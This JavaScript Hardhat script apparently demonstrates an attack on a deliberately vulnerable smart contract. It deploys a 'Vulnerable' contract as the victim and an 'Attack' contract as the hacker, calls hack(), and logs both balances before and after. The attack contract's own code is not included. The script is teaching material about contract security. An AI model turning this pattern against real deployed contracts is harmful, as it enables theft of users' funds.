const { ethers } = require('hardhat')

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

hack = async () => {
let Vulnerable, vulnerable, Attack, attack, signers, victim, hacker, overrides, victimBalance, hackerBalance

signers = await ethers.getSigners()
victim = signers[0]
hacker = signers[1]

console.log("I am the victim and I am deploying my vulnerable contract:")
Vulnerable = await ethers.getContractFactory("Vulnerable")
overrides = {
    value: ethers.utils.parseEther("0.000000004"),
}
vulnerable = await Vulnerable.deploy(overrides)
console.log("The vulnerable contract was deployed to " + vulnerable.address)
console.log("-----------------------------------------------")

console.log("I am the hacker and I am deploying my attack contract:")
Attack = await ethers.getContractFactory("Attack")
attack = await Attack.connect(hacker).deploy(vulnerable.address)
console.log("The attack contract was deployed to " + attack.address)
console.log("-----------------------------------------------")

victimBalance = await vulnerable.getBalance()
hackerBalance = await attack.getBalance()
console.log("The victim has " + victimBalance + " MATICs")
console.log("The hacker has " + hackerBalance + " MATICs")
console.log("-----------------------------------------------")

console.log("The hacker is about to hack()")
overrides = {
    value: ethers.utils.parseEther("0.000000001"),
    from: hacker.address
}
await attack.connect(hacker).hack(overrides)
console.log("-----------------------------------------------")

console.log("The hack is over:")
await sleep(20000)
victimBalance = await vulnerable.getBalance()
hackerBalance = await attack.getBalance()
console.log("The victim has " + victimBalance + " MATICs")
console.log("The hacker has " + hackerBalance + " MATICs")
}
hack()